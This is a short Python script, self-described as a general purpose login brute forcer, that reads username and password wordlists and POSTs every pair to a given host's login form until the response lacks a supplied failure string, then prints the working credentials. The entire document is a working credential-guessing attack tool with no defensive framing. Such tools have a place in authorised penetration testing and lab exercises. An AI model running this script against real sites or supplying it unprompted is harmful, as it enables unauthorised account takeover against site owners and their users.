#!/usr/bin/python3
import sys, getopt
import os
import requests as req
from bs4 import BeautifulSoup


# general purpose login brute forcer


def main(argv):
   try:
       opts, args = getopt.getopt(argv,"h:L:P:h:p:o:i:")
   except getopt.GetoptError:
      print('http-post-login.py -L <userfile> -P <passfile> -h host -p port -i <invalidstring>')
      sys.exit(2)
   print (opts)
   for opt, arg in opts:
      if opt == "-L":
         userfile = open(arg)
      elif opt == ("-P"):
         passfile = open(arg)
      elif opt == "-h":
         host = arg
      elif opt == "-p":
         port = arg
      elif opt == "-i":
         invalidstring = arg

   print ('host is', host)
   print ('port is ', port)
   
   try:
       begin_requesting(userfile,passfile,host,port,invalidstring)
   except:
      print('http-post-login.py -L <userfile> -P <passfile> -h host -p port -i <invalidstring>')


def begin_requesting(userfile, passfile, host, port, invalidstring):

    if "http" not in host:
        host = "http://" + host


    session = req.Session()
    resp = session.get(host)

    #phpsessid = resp.headers["Set-Cookie"].split(";")[0]
    #cookies={"Cookie": phpsessid}
    #print(cookies)
    
    usernames = userfile.readlines()
    passwords = passfile.readlines()


    found = False

    for username in usernames:
        for password in passwords:
            username = username.strip()
            password = password.strip()

            #data="username=" + username + "&password=" + password

            jsondata = {"username":username, "password": password}
            resp = session.post(host, data=jsondata)

            if invalidstring in resp.text:
                print(username + ":" + password)
            else:
                print(username + ":" + password + "  -----------SUCCESS!!!")
                found = True
                break

        if found:
            break
                
    
    

if __name__ == "__main__":
   main(sys.argv[1:])

